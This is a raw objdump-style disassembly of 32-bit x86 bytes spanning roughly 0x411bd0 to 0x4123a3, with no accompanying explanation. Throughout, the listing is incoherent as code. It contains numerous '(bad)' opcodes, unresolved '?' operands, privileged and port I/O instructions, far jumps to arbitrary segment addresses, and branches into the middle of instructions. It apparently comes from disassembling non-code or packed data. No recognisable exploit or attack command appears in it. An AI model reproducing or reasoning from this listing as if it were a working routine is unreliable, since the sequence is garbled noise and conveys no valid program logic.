  411bd0:	stos   BYTE PTR es:[edi],al
  411bd1:	xlat   BYTE PTR ds:[ebx]
  411bd2:	popa   
  411bd3:	ja     0x411c23
  411bd5:	repnz push esi
  411bd7:	cmp    edi,DWORD PTR fs:[eax+0x6e518ad9]
  411bde:	push   ss
  411bdf:	mov    edx,0xfb88bafd
  411be4:	mov    eax,0x65e46355
  411be9:	and    DWORD PTR [edi],ecx
  411beb:	vorps  ymm3,ymm0,ymm3
  411bef:	aas    
  411bf0:	call   0xd2541838
  411bf5:	and    DWORD PTR [edx+0x62],edx
  411bf8:	int    0x73
  411bfa:	nop
  411bfb:	pop    eax
  411bfc:	iret   
  411bfd:	sti    
  411bfe:	pop    ds
  411bff:	mov    cl,0x3c
  411c01:	cs cmp ah,ah
  411c04:	mov    ebx,0xcff7d1b2
  411c09:	mov    eax,ds:0x819175b2
  411c0e:	xchg   DWORD PTR [edi+0x6e],edi
  411c11:	test   al,0x34
  411c13:	and    eax,DWORD PTR [esi]
  411c15:	push   ds
  411c16:	jns    0x411c91
  411c18:	(bad)  
  411c19:	pushf  
  411c1a:	popa   
  411c1b:	jmp    0x1e0f:0x9900d6b8
  411c22:	mov    bl,0x9a
  411c24:	pop    ebp
  411c25:	inc    edx
  411c26:	pop    ebx
  411c27:	into   
  411c28:	aaa    
  411c29:	adc    cl,bh
  411c2b:	clc    
  411c2c:	pop    esi
  411c2d:	pusha  
  411c2e:	adc    BYTE PTR [eax-0x44],ah
  411c31:	neg    BYTE PTR [esi+0x7e]
  411c34:	xor    BYTE PTR [ebx+0x6],dl
  411c37:	vmovlps xmm3,xmm7,QWORD PTR [ebx-0x41ee04ff]
  411c3f:	dec    esi
  411c40:	xchg   esi,eax
  411c41:	out    0x5f,eax
  411c43:	inc    ecx
  411c44:	fst    DWORD PTR [esi+0x31ab0db9]
  411c4a:	push   0xffffffcf
  411c4c:	imul   ecx,DWORD PTR [ecx+0x4f],0xffffff8b
  411c50:	dec    esi
  411c51:	lods   eax,DWORD PTR ds:[esi]
  411c52:	adc    al,0xbc
  411c54:	push   ds
  411c55:	jg     0x411cc3
  411c57:	jp     0x411cab
  411c59:	push   ebx
  411c5a:	das    
  411c5b:	int3   
  411c5c:	jo     0x411cd2
  411c5e:	jg     0x411cc9
  411c60:	(bad)  [ebx-0x21552f26]
  411c66:	leave  
  411c67:	push   ebp
  411c68:	repz daa 
  411c6a:	xlat   BYTE PTR ds:[ebx]
  411c6b:	xor    DWORD PTR [ecx-0x41],edi
  411c6e:	or     DWORD PTR [ecx-0x7a],edi
  411c71:	inc    edx
  411c72:	in     eax,0xda
  411c74:	out    dx,eax
  411c75:	enter  0x5fdb,0x14
  411c79:	pop    es
  411c7a:	push   0xffffffa3
  411c7c:	retf   0xd9f4
  411c7f:	adc    DWORD PTR [eax],edx
  411c81:	xchg   ebp,eax
  411c82:	aam    0x59
  411c84:	push   es
  411c85:	fsub   st(7),st
  411c87:	push   edi
  411c88:	push   0xddbe530f
  411c8d:	fdiv   st(4),st
  411c8f:	sub    dl,BYTE PTR [eax-0x25]
  411c92:	add    BYTE PTR [esp+edi*2+0x38],bl
  411c96:	data16 addr16 out dx,al
  411c99:	pop    esp
  411c9a:	pop    edx
  411c9b:	or     edi,esp
  411c9d:	nop
  411c9e:	out    0xb3,eax
  411ca0:	push   0xe1fe3147
  411ca5:	xor    BYTE PTR [edx+0x68],dl
  411ca8:	dec    eax
  411ca9:	push   eax
  411caa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cac:	popa   
  411cad:	sbb    cl,BYTE PTR [ecx+0x5a46fe3d]
  411cb3:	call   0xf2bc52c9
  411cb8:	jge    0x411ce5
  411cba:	les    esi,FWORD PTR [edi]
  411cbc:	pop    es
  411cbd:	inc    esp
  411cbe:	jnp    0x411d3c
  411cc0:	sar    ch,0x84
  411cc3:	mov    esi,0x6794dfa1
  411cc8:	leave  
  411cc9:	jae    0x411ca2
  411ccb:	sub    DWORD PTR [esi+0x2f14fd85],0xa5efc3b1
  411cd5:	ins    BYTE PTR es:[edi],dx
  411cd6:	sub    eax,DWORD PTR [eax+0x366f1ab3]
  411cdc:	or     DWORD PTR cs:[edx-0x7557dc3c],ebp
  411ce3:	cmp    BYTE PTR [edi],0xbe
  411ce6:	xchg   ebp,eax
  411ce7:	retf   
  411ce8:	ret    
  411ce9:	mov    eax,ds:0x86d46282
  411cee:	cmp    DWORD PTR [esi-0x1d],esi
  411cf1:	arpl   WORD PTR ds:0x60dc2d01,cx
  411cf7:	xor    cl,cl
  411cf9:	dec    eax
  411cfa:	repnz retf 
  411cfc:	inc    eax
  411cfd:	inc    edi
  411cfe:	jae    0x411d20
  411d00:	repnz mov edi,edi
  411d03:	jns    0x411ccb
  411d05:	aad    0x70
  411d07:	and    al,0x55
  411d09:	dec    BYTE PTR [ebx-0x56]
  411d0c:	rcr    BYTE PTR [edi+ebp*8],0x77
  411d10:	inc    ecx
  411d11:	push   esi
  411d12:	idiv   BYTE PTR [eax]
  411d14:	push   ds
  411d15:	ret    0xc8a0
  411d18:	in     al,0x3c
  411d1a:	mov    edi,DWORD PTR [ebp-0x6c]
  411d1d:	dec    esi
  411d1e:	das    
  411d1f:	pusha  
  411d20:	sar    DWORD PTR [edi-0x4f],0x2d
  411d24:	nop
  411d25:	aas    
  411d26:	ja     0x411d61
  411d28:	mov    esi,0x1d71b5a3
  411d2d:	pop    edx
  411d2e:	xor    eax,0x90ad4272
  411d33:	xchg   ebp,eax
  411d34:	push   eax
  411d35:	aam    0x9f
  411d37:	jne    0x411d42
  411d39:	sar    DWORD PTR ds:0xf3f7f610,0x11
  411d40:	jno    0x411d76
  411d42:	js     0x411cf0
  411d44:	inc    ebp
  411d45:	out    0x4,eax
  411d47:	adc    DWORD PTR [edx-0x555a9ed9],ecx
  411d4d:	lahf   
  411d4e:	jmp    0x8b835f90
  411d53:	inc    ecx
  411d54:	ins    DWORD PTR es:[edi],dx
  411d55:	loope  0x411db8
  411d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d58:	pop    ebp
  411d59:	call   0x528e:0xf51343af
  411d60:	adc    edi,ebx
  411d62:	and    al,0xe4
  411d64:	jmp    0xcface28e
  411d69:	mov    ch,0x42
  411d6b:	mov    bh,cl
  411d6d:	and    dl,BYTE PTR [eax+0x38f99123]
  411d73:	mov    edx,edx
  411d75:	popa   
  411d76:	stos   DWORD PTR es:[edi],eax
  411d77:	sub    DWORD PTR [ecx+0x78],0x2a0d189
  411d7e:	repz repnz cmp al,0xeb
  411d82:	mov    ds:0xccfce8c,al
  411d87:	and    ax,0xb43c
  411d8b:	xor    bh,BYTE PTR [eax-0x52]
  411d8e:	leave  
  411d8f:	sahf   
  411d90:	repnz push ss
  411d92:	and    ebx,ecx
  411d94:	sbb    BYTE PTR [edx-0x1c],0xd9
  411d98:	std    
  411d99:	cmc    
  411d9a:	test   eax,0x5347db0d
  411d9f:	ins    BYTE PTR es:[edi],dx
  411da0:	jle    0x411d86
  411da2:	mov    ebx,0x878076b4
  411da7:	scas   al,BYTE PTR es:[edi]
  411da8:	push   ebx
  411da9:	mov    dl,0x88
  411dab:	mov    dl,0x83
  411dad:	adc    DWORD PTR [esi],ebx
  411daf:	enter  0xf583,0x18
  411db3:	mov    ebx,0x634d7c19
  411db8:	stos   BYTE PTR es:[edi],al
  411db9:	adc    DWORD PTR [ebx+0x18],eax
  411dbc:	mov    bl,0x9c
  411dbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dbf:	mov    ds:0xfd156db6,al
  411dc4:	test   edx,0xbf32cc5e
  411dca:	jge    0x411e15
  411dcc:	mov    edi,0x83b13096
  411dd1:	rcr    esp,0x34
  411dd4:	shl    BYTE PTR [ebx],1
  411dd6:	pop    edi
  411dd7:	sub    ecx,ebp
  411dd9:	int3   
  411dda:	inc    edx
  411ddb:	popf   
  411ddc:	loope  0x411de0
  411dde:	cmp    edi,DWORD PTR [edx-0x7db1411a]
  411de4:	push   0xcffa965
  411de9:	pop    es
  411dea:	mov    dh,0xf1
  411dec:	jg     0x411e20
  411dee:	nop
  411def:	dec    ebx
  411df0:	fiadd  WORD PTR [eax+0x7a]
  411df3:	jae    0x411e31
  411df5:	scas   eax,DWORD PTR es:[edi]
  411df6:	les    edi,FWORD PTR [esi+0x4f685f3d]
  411dfc:	cs mov esi,0xfca1473d
  411e02:	cmc    
  411e03:	xchg   DWORD PTR [eax+esi*2+0x8],esi
  411e07:	sbb    eax,0xc5f25a82
  411e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e0d:	jmp    0x689511be
  411e12:	and    al,0xa4
  411e14:	dec    esp
  411e15:	gs mov bl,0x98
  411e18:	cmp    ecx,edx
  411e1a:	adc    esp,DWORD PTR [esp+edx*8+0x792337e2]
  411e21:	adc    ch,BYTE PTR [ebp-0xd]
  411e24:	cmp    al,0x2e
  411e26:	mov    edi,DWORD PTR [esi]
  411e28:	mov    esi,DWORD PTR [ecx+0x0]
  411e2b:	mov    WORD PTR [ebx+0x4b],ds
  411e2e:	addr16 gs ds inc ebx
  411e32:	adc    al,0x46
  411e34:	out    0x93,eax
  411e36:	stc    
  411e37:	stc    
  411e38:	jne    0x411eac
  411e3a:	cmp    ecx,ebp
  411e3c:	cmc    
  411e3d:	(bad)
  411e40:	jg     0x411e5a
  411e42:	aas    
  411e43:	retf   0x6286
  411e46:	out    0x30,al
  411e48:	aaa    
  411e49:	daa    
  411e4a:	push   edi
  411e4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e4c:	push   ebp
  411e4d:	std    
  411e4e:	call   0x4ca7:0x2244ac7b
  411e55:	or     al,0xcf
  411e57:	mov    eax,ds:0x941287a3
  411e5c:	retf   0x7bb8
  411e5f:	popf   
  411e60:	xchg   BYTE PTR [esi+0x416665fd],bl
  411e66:	sbb    DWORD PTR [edx-0x5048272],0xffffffea
  411e6d:	sti    
  411e6e:	lods   eax,DWORD PTR ds:[esi]
  411e6f:	cmc    
  411e70:	js     0x411ed8
  411e72:	mov    dl,0x3c
  411e74:	pop    esi
  411e75:	mov    es,WORD PTR [esi]
  411e77:	ins    BYTE PTR es:[edi],dx
  411e78:	cwde   
  411e79:	adc    eax,0xde975478
  411e7e:	popf   
  411e7f:	adc    al,0x82
  411e81:	add    al,0x6f
  411e83:	xor    bh,0xbb
  411e86:	xchg   ebx,eax
  411e87:	mov    bh,0x81
  411e89:	popa   
  411e8a:	pop    edi
  411e8b:	adc    BYTE PTR [ebx+0x2b],dl
  411e8e:	loop   0x411e97
  411e90:	lods   al,BYTE PTR ds:[esi]
  411e91:	mov    eax,ds:0x4190ef18
  411e96:	sahf   
  411e97:	inc    esp
  411e98:	mov    cs,edx
  411e9a:	pop    edi
  411e9b:	les    esi,FWORD PTR [esi]
  411e9d:	cmp    eax,0x1ab99049
  411ea2:	pop    es
  411ea3:	jbe    0x411ed8
  411ea5:	es mov al,0xeb
  411ea8:	es loopne 0x411f12
  411eab:	sahf   
  411eac:	fld    TBYTE PTR [eax+0x52]
  411eaf:	push   edi
  411eb0:	shr    BYTE PTR [eax-0x59],0x75
  411eb4:	adc    DWORD PTR [eax],esi
  411eb6:	cs push esi
  411eb8:	jp     0x411e79
  411eba:	cmp    al,0x4c
  411ebc:	sbb    esi,DWORD PTR [edi]
  411ebe:	aaa    
  411ebf:	dec    ebx
  411ec0:	cli    
  411ec1:	mov    ds:0x2fcb0765,eax
  411ec6:	jnp    0x411ed1
  411ec8:	inc    edi
  411ec9:	pop    edi
  411eca:	push   0x19cec68b
  411ecf:	mov    edx,0x96984571
  411ed4:	aad    0x8
  411ed6:	or     BYTE PTR [eax-0x74602d0a],ch
  411edc:	jp     0x411e6c
  411ede:	out    dx,al
  411edf:	mov    ebp,0x77df6f75
  411ee4:	xor    edx,ebx
  411ee6:	adc    eax,0x960bf808
  411eeb:	inc    edx
  411eec:	ja     0x411eab
  411eee:	(bad)  
  411eef:	lds    ebx,FWORD PTR [ebp-0x77]
  411ef2:	mov    cs,WORD PTR [edi+0x5a6b0180]
  411ef8:	aam    0xde
  411efa:	inc    ebp
  411efb:	jae    0x411ee0
  411efd:	push   es
  411efe:	adc    eax,0x7f27e601
  411f03:	and    eax,0xeb62764e
  411f08:	jmp    0x411f45
  411f0a:	xchg   edi,eax
  411f0b:	xchg   ebp,eax
  411f0c:	hlt    
  411f0d:	jle    0x411f01
  411f0f:	(bad)  
  411f10:	fnstcw WORD PTR [ebp-0x6c]
  411f13:	fsub   QWORD PTR [esi]
  411f15:	push   ebx
  411f16:	out    dx,eax
  411f17:	and    esp,esi
  411f19:	and    eax,0xa48200b0
  411f1e:	into   
  411f1f:	dec    ecx
  411f20:	dec    edi
  411f21:	pushf  
  411f22:	call   0x1d107164
  411f27:	push   0x34
  411f29:	jbe    0x411f6f
  411f2b:	inc    esi
  411f2c:	sbb    ebp,edi
  411f2e:	push   ebx
  411f2f:	dec    ebx
  411f30:	sub    esp,DWORD PTR [ebx+0x3ab935e4]
  411f36:	in     al,dx
  411f37:	sbb    DWORD PTR [edx+ecx*4],edx
  411f3a:	adc    edx,DWORD PTR [eax+0x11]
  411f3d:	repz ror BYTE PTR [eax],1
  411f40:	es dec ecx
  411f42:	pushf  
  411f43:	cwde   
  411f44:	loopne 0x411f05
  411f46:	add    al,BYTE PTR [edi-0x4c]
  411f49:	sub    bh,0xc7
  411f4c:	pusha  
  411f4d:	fs sub al,0x91
  411f50:	xchg   esi,eax
  411f51:	aaa    
  411f52:	cmp    BYTE PTR [eax],dh
  411f54:	mov    ah,0xcf
  411f56:	adc    esp,DWORD PTR [ecx]
  411f58:	dec    edi
  411f59:	mov    edx,0x3c3d9be6
  411f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f5f:	mov    ebp,0xca2450cd
  411f64:	pusha  
  411f65:	cmp    eax,0x4225a520
  411f6a:	jb     0x411fd7
  411f6c:	aas    
  411f6d:	adc    DWORD PTR [esi],0x4e
  411f70:	ss mov cl,0x50
  411f73:	inc    esp
  411f74:	mov    cl,0x50
  411f76:	push   ss
  411f77:	and    eax,esp
  411f79:	hlt    
  411f7a:	inc    ecx
  411f7b:	sbb    al,0xea
  411f7d:	mov    esp,0xa31ffb42
  411f82:	lock xchg ebp,eax
  411f84:	mov    ds:0xb96f9dd7,eax
  411f89:	adc    eax,0x99b530cf
  411f8e:	jmp    0x411fd5
  411f90:	jmp    0x411fe4
  411f92:	imul   DWORD PTR ds:0x8b1230d0
  411f98:	xchg   BYTE PTR [bx+di+0x368c],ch
  411f9d:	inc    esi
  411f9e:	dec    esi
  411f9f:	adc    al,0xad
  411fa1:	pop    ebp
  411fa2:	jg     0x411fe5
  411fa4:	pop    esi
  411fa5:	inc    esp
  411fa6:	jno    0x411fb7
  411fa8:	pop    ds
  411fa9:	mov    ds:0x16abba4e,eax
  411fae:	into   
  411faf:	and    ah,bl
  411fb1:	push   ecx
  411fb2:	mov    ah,ch
  411fb4:	pop    ss
  411fb5:	aad    0x1f
  411fb7:	push   eax
  411fb8:	inc    eax
  411fb9:	addr16 sbb eax,0x78d13626
  411fbf:	out    0xc1,al
  411fc1:	push   esi
  411fc2:	pop    ebx
  411fc3:	inc    edi
  411fc4:	or     al,0x6b
  411fc6:	(bad)  
  411fc7:	loopne 0x411fe5
  411fc9:	push   ss
  411fca:	dec    edi
  411fcb:	and    DWORD PTR [edx-0x20600bfa],0x76cf1a3e
  411fd5:	push   eax
  411fd6:	mov    edx,0x25d844e
  411fdb:	out    dx,eax
  411fdc:	fdiv   QWORD PTR [edi+0x3d89824c]
  411fe2:	stos   DWORD PTR es:[edi],eax
  411fe3:	shl    ch,cl
  411fe5:	push   es
  411fe6:	mov    al,0xcc
  411fe8:	cmp    esp,DWORD PTR ds:0x35bd7b0e
  411fee:	mov    ?,WORD PTR [ecx]
  411ff0:	fiadd  WORD PTR [ebx-0x3d]
  411ff3:	add    BYTE PTR [esi],dl
  411ff5:	jb     0x411fb2
  411ff7:	cmp    ecx,eax
  411ff9:	push   edi
  411ffa:	mov    DWORD PTR [edx],edi
  411ffc:	jnp    0x411fb3
  411ffe:	mov    ecx,0xb308743e
  412003:	mov    bl,BYTE PTR [edi+0x5ab9b7e0]
  412009:	fs sti 
  41200b:	test   eax,0x8ba2d71d
  412010:	push   edx
  412011:	lods   eax,DWORD PTR ds:[esi]
  412012:	cdq    
  412013:	enter  0xc091,0x1b
  412017:	arpl   WORD PTR [eax+0x39],di
  41201a:	sub    eax,0xa6559079
  41201f:	jno    0x412028
  412021:	add    BYTE PTR [ebx],ch
  412023:	lea    edx,[esi+0x52]
  412026:	sbb    ebx,DWORD PTR [ebp-0x5e18c740]
  41202c:	or     BYTE PTR [eax+eiz*2+0x11],ah
  412030:	ret    
  412031:	mov    bl,0xe0
  412033:	cmp    BYTE PTR [edi+0x32ecfbb0],al
  412039:	sub    edx,DWORD PTR [edx-0x3d]
  41203c:	xor    al,0x40
  41203e:	jb     0x412017
  412040:	mov    ebx,0xd6b2ef72
  412045:	push   ds
  412046:	dec    edx
  412047:	mov    ebp,0x5f5f2ba3
  41204c:	or     edi,DWORD PTR [eax+0x75a91622]
  412052:	adc    DWORD PTR [edx+0x5288fb56],edx
  412058:	xchg   ah,ah
  41205a:	imul   eax,ebp,0x51
  41205d:	mov    ebp,0xf5065d84
  412062:	(bad)  
  412063:	xlat   BYTE PTR ds:[ebx]
  412064:	mov    edx,eax
  412066:	(bad)  
  412067:	sbb    al,0x1c
  412069:	xchg   DWORD PTR [eax+0x6e],ebp
  41206c:	lahf   
  41206d:	(bad)  
  41206e:	and    al,0x35
  412070:	fisttp QWORD PTR [edi+ecx*8+0x4768f9]
  412077:	les    eax,FWORD PTR [edx]
  412079:	push   ebx
  41207a:	pop    ss
  41207b:	xchg   ecx,eax
  41207c:	adc    eax,0x81f86c31
  412081:	jno    0x412028
  412083:	jnp    0x4120e4
  412085:	or     cl,BYTE PTR [ebp-0x3]
  412088:	push   esi
  412089:	addr16 pop es
  41208b:	mov    ds:0x6ca671f9,al
  412090:	cdq    
  412091:	inc    eax
  412092:	mov    bh,0xa4
  412094:	mov    dl,0xcd
  412096:	fs mov esp,0x96cf8483
  41209c:	(bad)  
  41209e:	pop    ecx
  41209f:	jnp    0x41205b
  4120a1:	popa   
  4120a2:	or     esp,esp
  4120a4:	retf   
  4120a5:	push   es
  4120a6:	rol    esp,cl
  4120a8:	jo     0x4120a9
  4120aa:	repnz repnz adc edi,ebp
  4120ae:	ror    BYTE PTR [eax-0x28],1
  4120b1:	cmc    
  4120b2:	jge    0x4120f8
  4120b4:	xchg   ebx,eax
  4120b5:	dec    eax
  4120b6:	mov    WORD PTR [edx+0xe5476be],gs
  4120bc:	std    
  4120bd:	lea    ecx,[esi+edx*2]
  4120c0:	sbb    edi,edx
  4120c2:	push   ecx
  4120c3:	leave  
  4120c4:	and    DWORD PTR [ebp-0x12ef40d5],edx
  4120ca:	fs inc esi
  4120cc:	cmp    eax,0xb5da3b62
  4120d1:	xlat   BYTE PTR ds:[ebx]
  4120d2:	xor    ch,ah
  4120d4:	add    edi,ebx
  4120d6:	and    BYTE PTR [ebx+0xe2b1fa8],ah
  4120dc:	mov    eax,ds:0xa7bb66f
  4120e1:	xchg   DWORD PTR [esi-0x61],edx
  4120e4:	dec    edi
  4120e5:	pop    eax
  4120e6:	mov    ch,BYTE PTR [ebp+0x36]
  4120e9:	mov    al,ds:0x523c9030
  4120ee:	lods   eax,DWORD PTR ds:[esi]
  4120ef:	je     0x41210e
  4120f1:	dec    esp
  4120f2:	dec    edi
  4120f3:	repz jp 0x412092
  4120f6:	ror    BYTE PTR [ebx],0x1e
  4120f9:	xchg   BYTE PTR [esi+0x6],dl
  4120fc:	mov    al,ds:0xde1f3d1
  412101:	pop    ecx
  412102:	sub    al,0xf2
  412104:	or     ebx,DWORD PTR [eax+0x162264f]
  41210a:	daa    
  41210b:	mov    dl,BYTE PTR [edx+0x17]
  41210e:	xchg   BYTE PTR [esi],bh
  412110:	out    0xd5,eax
  412112:	outs   dx,BYTE PTR ds:[esi]
  412113:	mov    ds:0x1b53461,eax
  412118:	bound  ebp,QWORD PTR [ebp+0x54]
  41211b:	pop    edx
  41211c:	and    al,ah
  41211e:	neg    BYTE PTR [edx+0x1325767b]
  412124:	pushf  
  412125:	or     eax,0x8b56cd8b
  41212b:	scas   al,BYTE PTR es:[edi]
  41212c:	mov    dh,0xd
  41212e:	jb     0x41219a
  412130:	mov    bl,0xc8
  412132:	mov    bh,0x2e
  412134:	jno    0x4120f9
  412136:	jne    0x4121b4
  412138:	stos   DWORD PTR es:[edi],eax
  412139:	mov    esp,0x538dcafa
  41213e:	rdpmc  
  412140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412141:	xor    edi,ebx
  412143:	sbb    al,0xbe
  412145:	outs   dx,BYTE PTR ds:[esi]
  412146:	and    BYTE PTR [eax-0x1],dh
  412149:	call   0xf6f0:0xfb19ea6f
  412150:	cmp    edi,DWORD PTR [esi-0x17]
  412153:	shl    ebx,0x38
  412156:	mov    bh,0x31
  412158:	lea    ecx,[eax]
  41215a:	cdq    
  41215b:	rep lods al,BYTE PTR ds:[esi]
  41215d:	xchg   esp,eax
  41215e:	retf   0x38e4
  412161:	mov    fs,WORD PTR ds:0xe98eb370
  412167:	scas   al,BYTE PTR es:[edi]
  412168:	repz bound esi,QWORD PTR [eax-0x75a18126]
  41216f:	not    BYTE PTR [eax+0x5ef9d237]
  412175:	ds xchg esp,eax
  412177:	and    ebx,DWORD PTR [edx-0x19b30c10]
  41217d:	cwde   
  41217e:	push   0xffffff88
  412180:	jb     0x412122
  412182:	dec    ebp
  412183:	jle    0x4121d5
  412185:	jb     0x4121ff
  412187:	and    DWORD PTR [esi+0x308c080e],ebp
  41218d:	ret    
  41218e:	dec    esp
  41218f:	jge    0x4121ea
  412191:	inc    ecx
  412192:	cmp    al,0x48
  412194:	test   eax,0x59ba9da9
  412199:	jb     0x4121bd
  41219b:	pusha  
  41219c:	xchg   ebx,eax
  41219d:	hlt    
  41219e:	mov    ecx,0x791b70f9
  4121a3:	loopne 0x412134
  4121a5:	mov    DWORD PTR [ecx],esi
  4121a7:	jne    0x412167
  4121a9:	lock imul edi,DWORD PTR [eax+0x53dd7a78],0xffffffe3
  4121b1:	in     al,dx
  4121b2:	scas   eax,DWORD PTR es:[edi]
  4121b3:	add    BYTE PTR [edi+0x19f9e374],cl
  4121b9:	mov    es,WORD PTR [ebx+ebx*1-0x61fb7ea7]
  4121c0:	mov    ebx,ebx
  4121c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c3:	clc    
  4121c4:	add    eax,0x2400458e
  4121c9:	mov    ah,0x8f
  4121cb:	imul   eax,DWORD PTR [esi+0x8]
  4121cf:	retf   
  4121d0:	pop    eax
  4121d1:	dec    ecx
  4121d2:	xchg   esp,eax
  4121d3:	dec    edx
  4121d4:	pop    esp
  4121d5:	cli    
  4121d6:	add    bl,BYTE PTR [eax-0xf]
  4121d9:	sub    DWORD PTR [ebx+0x6a13e3bc],edx
  4121df:	jae    0x412241
  4121e1:	mov    bh,0x9
  4121e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121e4:	pop    edx
  4121e5:	es int 0x5e
  4121e8:	push   esi
  4121e9:	push   cs
  4121ea:	adc    eax,0x429a1420
  4121ef:	mov    ?,WORD PTR [ebp+0x30]
  4121f2:	mov    ?,WORD PTR [edi+0x5ee6fda6]
  4121f8:	push   ss
  4121f9:	or     al,0x26
  4121fb:	add    eax,0x49de234f
  412200:	jnp    0x412270
  412202:	jae    0x41219a
  412204:	fist   DWORD PTR [esi]
  412206:	lods   eax,DWORD PTR ds:[esi]
  412207:	or     ebx,ebx
  412209:	imul   edx,DWORD PTR [esi+0x7acbe1cd],0x41e1000e
  412213:	and    ebx,ebp
  412215:	test   DWORD PTR [ecx+eax*2],0x410fc1cc
  41221c:	fiadd  WORD PTR [edi+eax*8+0x1ca66491]
  412223:	inc    esp
  412224:	jecxz  0x412283
  412226:	jae    0x412235
  412228:	mov    WORD PTR [ebx+0x5d],gs
  41222b:	gs mov ah,0x2f
  41222e:	sub    al,0xab
  412230:	xor    cl,ch
  412232:	pop    edx
  412233:	cmp    edi,0x40f67fa4
  412239:	stc    
  41223a:	addr16 fwait
  41223c:	addr16 hlt 
  41223e:	loop   0x41222f
  412240:	jmp    0xb5336309
  412245:	push   edx
  412246:	sbb    bl,ah
  412248:	loope  0x4122b1
  41224a:	mov    edx,0xcd1b4440
  41224f:	loop   0x4121f6
  412251:	sbb    edi,DWORD PTR [edi]
  412253:	jle    0x412275
  412255:	pop    esp
  412256:	outs   dx,BYTE PTR ds:[esi]
  412257:	sub    BYTE PTR [ecx-0x4f],ah
  41225a:	jmp    0x2c8:0x9b4ad5a3
  412261:	test   al,0xd2
  412263:	fsubr  DWORD PTR gs:[ecx+edx*2+0x64]
  412268:	mov    DWORD PTR [esi-0x3d1c000a],0x5b2780ce
  412272:	adc    al,0x5f
  412274:	aas    
  412275:	out    dx,al
  412276:	jne    0x412298
  412278:	pop    es
  412279:	add    eax,0x4607eedd
  41227e:	int3   
  41227f:	mov    al,0x8d
  412281:	out    0xca,al
  412283:	int    0x97
  412285:	mov    ds:0xa24dbc58,eax
  41228a:	mov    al,0xac
  41228c:	or     DWORD PTR [esi],ebx
  41228e:	cld    
  41228f:	pop    eax
  412290:	into   
  412291:	pop    esi
  412292:	std    
  412293:	cmp    ebx,DWORD PTR [ecx+ebx*4-0x28a325a4]
  41229a:	sub    dh,ah
  41229c:	push   0xd4b63068
  4122a1:	loop   0x4122cd
  4122a3:	in     eax,0xf6
  4122a5:	or     ecx,edx
  4122a7:	mov    dl,BYTE PTR [ebx+0x7e]
  4122aa:	stos   DWORD PTR es:[edi],eax
  4122ab:	xor    BYTE PTR [edi+0x3034ddd4],dh
  4122b1:	and    esi,DWORD PTR [ebp+ebp*4-0x18]
  4122b5:	ja     0x412282
  4122b7:	push   ebx
  4122b8:	pusha  
  4122b9:	sbb    ebp,esp
  4122bb:	leave  
  4122bc:	mov    esp,DWORD PTR [ebp-0x4cb59f4a]
  4122c2:	arpl   WORD PTR [ecx+edi*8],bp
  4122c5:	adc    eax,esp
  4122c7:	pushf  
  4122c8:	les    esp,FWORD PTR [ebp+0x36]
  4122cb:	push   edx
  4122cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122cd:	stos   DWORD PTR es:[edi],eax
  4122ce:	push   ds
  4122cf:	dec    esp
  4122d0:	mov    ds:0xb87b0abf,al
  4122d5:	mov    bh,0x59
  4122d7:	cmp    al,0x81
  4122d9:	dec    esi
  4122da:	sub    ah,BYTE PTR [ecx-0x503d1dd1]
  4122e0:	pop    esp
  4122e1:	mov    edi,0xc5e2bf3f
  4122e6:	or     esp,DWORD PTR [ecx+0x6903aea5]
  4122ec:	jno    0x412297
  4122ee:	scas   eax,DWORD PTR es:[edi]
  4122ef:	xchg   edi,eax
  4122f0:	inc    ebp
  4122f1:	lods   al,BYTE PTR ds:[esi]
  4122f2:	or     edi,DWORD PTR [eax+0x77ef9063]
  4122f8:	iret   
  4122f9:	ins    DWORD PTR es:[edi],dx
  4122fa:	xchg   ebp,eax
  4122fb:	ret    0x632
  4122fe:	xor    DWORD PTR [ebx+0x222eb237],0xe66bcadb
  412308:	add    edx,DWORD PTR [esi+eiz*8+0x2ca65f1e]
  41230f:	pop    ss
  412310:	int3   
  412311:	js     0x4122df
  412313:	dec    eax
  412314:	test   BYTE PTR [ebx+ebx*2-0x4187255e],ah
  41231b:	ror    al,1
  41231d:	sbb    eax,0x73ffad87
  412322:	fdiv   QWORD PTR [ebx]
  412324:	sub    bl,ch
  412326:	push   edx
  412327:	jo     0x412326
  412329:	mov    al,ds:0x7b09269e
  41232e:	mov    esi,0xdc83c2d0
  412333:	xchg   edi,eax
  412334:	push   edi
  412335:	mov    ecx,0xd97e2215
  41233a:	cs inc esp
  41233c:	daa    
  41233d:	ins    DWORD PTR es:[edi],dx
  41233e:	and    eax,0xce359330
  412343:	add    esi,DWORD PTR [ecx+0x47]
  412346:	jnp    0x4122d9
  412348:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41234a:	int    0x9a
  41234c:	lods   eax,DWORD PTR ds:[esi]
  41234d:	retf   
  41234e:	(bad)  
  412350:	aam    0x9f
  412352:	push   es
  412353:	int    0xb3
  412355:	loop   0x4123bc
  412357:	add    edx,edi
  412359:	retf   
  41235a:	cmp    esp,DWORD PTR [eax-0xa]
  41235d:	(bad)  
  41235e:	mov    eax,0xddb6ccea
  412363:	jmp    0x18f8:0x30c53f07
  41236a:	fidivr WORD PTR [esi-0x49323d24]
  412370:	dec    esi
  412371:	ins    DWORD PTR es:[edi],dx
  412372:	cwde   
  412373:	xchg   ebp,eax
  412374:	loopne 0x4123ac
  412376:	dec    eax
  412377:	inc    edi
  412378:	hlt    
  412379:	aam    0x14
  41237b:	mov    fs,WORD PTR [ecx-0x6b]
  41237e:	lock inc ecx
  412380:	cmc    
  412381:	jp     0x412354
  412383:	fld    QWORD PTR ds:0xd96119a5
  412389:	outs   dx,DWORD PTR gs:[esi]
  41238b:	aad    0x5f
  41238d:	inc    edx
  41238e:	or     edx,esi
  412390:	(bad)  
  412391:	sub    cl,BYTE PTR [ecx-0x1d93380f]
  412397:	sub    ch,dl
  412399:	cdq    
  41239a:	icebp  
  41239b:	cmp    DWORD PTR [edi],ecx
  41239d:	push   ebx
  41239e:	jbe    0x4123bc
  4123a0:	xchg   edi,eax
  4123a1:	sbb    al,0xfe
  4123a3:	adc    ebp,ebp
